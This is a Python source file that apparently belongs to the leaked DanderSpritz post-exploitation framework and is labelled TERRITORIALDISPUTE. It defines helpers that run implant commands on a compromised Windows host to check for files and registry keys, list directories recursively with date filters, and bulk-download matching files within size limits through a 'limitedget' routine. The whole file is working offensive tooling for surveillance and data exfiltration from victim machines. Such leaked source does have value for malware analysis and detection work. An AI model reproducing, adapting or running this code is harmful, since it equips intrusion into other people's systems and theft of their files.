
import dsz.cmd
import re
import time
import getutils
import datastore
from util.DSZPyLogger import getLogger
import os.path
tedilog = getLogger('TERRITORIALDISPUTE')

def path_normalize(path):
    try:
        path = re.sub('%(.+)%', (lambda m: ('%{0}%'.format(m.group(1)) if (m.group(1) not in datastore.ENV_VARS) else datastore.ENV_VARS[m.group(1)])), path)
    except:
        tedilog.error('There was an error trying to parse the path for environment variables.', exc_info=True)
    return path

def file_exists(path, name):
    path = path_normalize(path)
    cmd = (u'fileattributes -file "%s\\%s"' % (path, name))
    (cmdStatus, cmdId) = dsz.cmd.RunEx(cmd.encode('utf8'), dsz.RUN_FLAG_RECORD)
    if cmdStatus:
        [attrib_value] = dsz.cmd.data.Get('file::attributes::value', dsz.TYPE_INT, cmdId)
        if (attrib_value > 0):
            return True
        else:
            return False
    else:
        return False

def reg_exists(hive, key, value=None, recurse=False):
    cmd = (u'registryquery -hive %s -key "%s"' % (hive, key))
    if (value is not None):
        cmd = (cmd + (u' -value "%s"' % value))
    if recurse:
        cmd = (cmd + u' -recursive')
    cmdStatus = dsz.cmd.RunEx(cmd.encode('utf8'), 0)[0]
    if cmdStatus:
        return True
    else:
        return False

def file_exists_recursive(name, path=None):
    if (path is None):
        cmd = ('dir -mask "%s" -recursive' % name)
    else:
        path = path_normalize(path)
        cmd = ('dir -path "%s" -mask "%s" -recursive' % (path.strip('\\'), name))
    dsz.control.Method()
    dsz.control.echo.Off()
    if (not dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)):
        return False
    else:
        try:
            return (dsz.cmd.data.Size('DirItem::FileItem') > 0)
        except:
            return False

def dirlist(targetmask, targetpath, after=None, before=None, age=None, timetype='modified', individual=False, recursive=False, background=False):
    if ((targetpath == None) or (targetmask == None)):
        print 'Must provide a path and a mask'
        return False
    if ((age is not None) and ((before is not None) or (after is not None))):
        print 'Can not declare an age with before or after statements'
        return False
    if before:
        if (not re.match('\\d{4}\\-\\d{2}\\-\\d{2}$', before)):
            print 'Before statement must be in the YYYY-MM-DD Format'
            return False
    if after:
        if (not re.match('\\d{4}\\-\\d{2}\\-\\d{2}$', after)):
            print 'After statement must be in the YYYY-MM-DD Format'
            return False
    if (before and after):
        t1 = time.strptime(('%s' % before), '%Y-%m-%d')
        t2 = time.strptime(('%s' % after), '%Y-%m-%d')
        if (time.mktime(t1) > time.mktime(t2)):
            print 'Before date is greater than after date provided'
            return False
    if (not re.match('modified|accessed|created', timetype)):
        print 'Time must be set to accessed|created|modified'
        return False
    targetpath = path_normalize(targetpath)
    totalSize = 0
    filesToGet = []
    dircmd = ('dir -mask "%s" -path "%s" -max 0' % (targetmask, targetpath))
    if age:
        dircmd += (' -age %s' % str(age))
    if before:
        dircmd += (' -before %s' % str(before))
    if after:
        dircmd += (' -after %s' % str(after))
    if time:
        dircmd += (' -time %s' % timetype)
    if (recursive is True):
        dircmd += ' -recursive'
    dsz.control.echo.Off()
    dsz.cmd.Run(dircmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    for diritem in dsz.cmd.data.Get('DirItem', dsz.TYPE_OBJECT):
        [dirName] = dsz.cmd.data.ObjectGet(diritem, 'path', dsz.TYPE_STRING)
        for fileitem in dsz.cmd.data.ObjectGet(diritem, 'FileItem', dsz.TYPE_OBJECT):
            [fileName] = dsz.cmd.data.ObjectGet(fileitem, 'name', dsz.TYPE_STRING)
            [fileTime] = dsz.cmd.data.ObjectGet(fileitem, ('filetimes::%s::time' % timetype), dsz.TYPE_STRING)
            fullPath = os.path.join(dirName, fileName)
            [isDir] = dsz.cmd.data.ObjectGet(fileitem, 'attributes::directory', dsz.TYPE_BOOL)
            if (not isDir):
                [size] = dsz.cmd.data.ObjectGet(fileitem, 'size', dsz.TYPE_INT)
                filesToGet.append((fullPath, fileTime, size))
                totalSize += size
    return (filesToGet, totalSize)

def limitedget(path, name, maxfilesize=None, maxtotalsize=None, maxfiles=None, recursive=False, **kwargs):
    path = path_normalize(path)
    print ('limitedgetting %s' % os.path.join(path, name))
    (filestoget, totalsize) = dirlist(name, path, background=True, **kwargs)
    filestoget.sort(key=(lambda x: x[1]))
    if ((maxtotalsize is not None) or (maxfilesize is not None)):
        tmptotalsize = 0
        tmpfilestoget = []
        for ftup in filestoget:
            tmpfilesize = ftup[2]
            if ((maxfilesize is not None) and (tmpfilesize > maxfilesize)):
                print ('Skipping %s; Size (%db) exceeds limit of %db' % (ftup[0], tmpfilesize, maxfilesize))
                continue
            tmptotalsize += tmpfilesize
            if ((maxtotalsize is not None) and (tmptotalsize > maxtotalsize)):
                print ('Skipping %s; its file size (%db) would exceed the max total size. (Downloaded %db/%db).' % (ftup[0], tmpfilesize, tmptotalsize, maxtotalsize))
                tmptotalsize -= tmpfilesize
                continue
            tmpfilestoget.append(ftup)
        filestoget = tmpfilestoget
    if (maxfiles is not None):
        filestoget = filestoget[:maxfiles]
    for ftup in filestoget:
        filename = ftup[0]
        getutils.wrapget(filename, copygetmsg='[TERRITORIALDISPUTE] A file requires a copy get in order to get. Allow copyget?')